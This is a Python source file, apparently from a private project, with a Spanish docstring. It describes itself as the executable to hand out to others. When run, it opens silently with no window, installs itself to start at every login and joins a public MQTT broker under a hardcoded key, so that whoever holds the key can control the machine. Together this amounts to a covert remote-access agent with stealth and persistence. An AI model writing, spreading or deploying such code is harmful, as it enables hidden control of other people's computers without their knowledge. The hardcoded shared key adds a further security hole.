"""
agente_auto.py - EL EJECUTABLE QUE REPARTES.

Se abre en silencio (sin ninguna ventana), calcula su propia sala unica, se
conecta al broker con la CLAVE FIJA de abajo y anuncia su presencia. En tu
monitor (consola_flota) aparece solo. Ademas se auto-instala para arrancar en
cada inicio de sesion. Quien lo ejecuta no tiene que hacer ni configurar nada.

IMPORTANTE: la clave va fija aqui a proposito (para que sea "solo ejecutar").
Manten el repositorio y los .exe en PRIVADO: quien tenga esta clave y el broker
puede controlar los equipos.
"""

import time
import socket
import threading

import nube
import agente_nube
import flota

# ---- Configuracion fija (edita a tu gusto; repo PRIVADO) -------------------
CLAVE = "ACM-flota-2026-tunel-9f3k2Z"          # >= 8 caracteres, no la de por defecto
BROKER = nube.BROKER_POR_DEFECTO               # broker.emqx.io
PUERTO = 8883
# ---------------------------------------------------------------------------


def main():
    # Auto-instalacion (se copia a carpeta estable y arranca en cada inicio).
    try:
        import autoinstalar
        if autoinstalar.instalar_si_hace_falta().get("relanzado"):
            return
    except Exception:
        pass

    sala = flota.sala_de_este_pc()
    agente = agente_nube.AgenteNube(BROKER, PUERTO, sala, CLAVE,
                                    tls=True, log=lambda *a: None)
    baliza = flota.Baliza(BROKER, PUERTO, CLAVE, sala, tls=True)

    threading.Thread(target=agente.run, daemon=True).start()
    threading.Thread(target=baliza.run, daemon=True).start()

    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        agente.parar()
        baliza.parar()


if __name__ == "__main__":
    main()
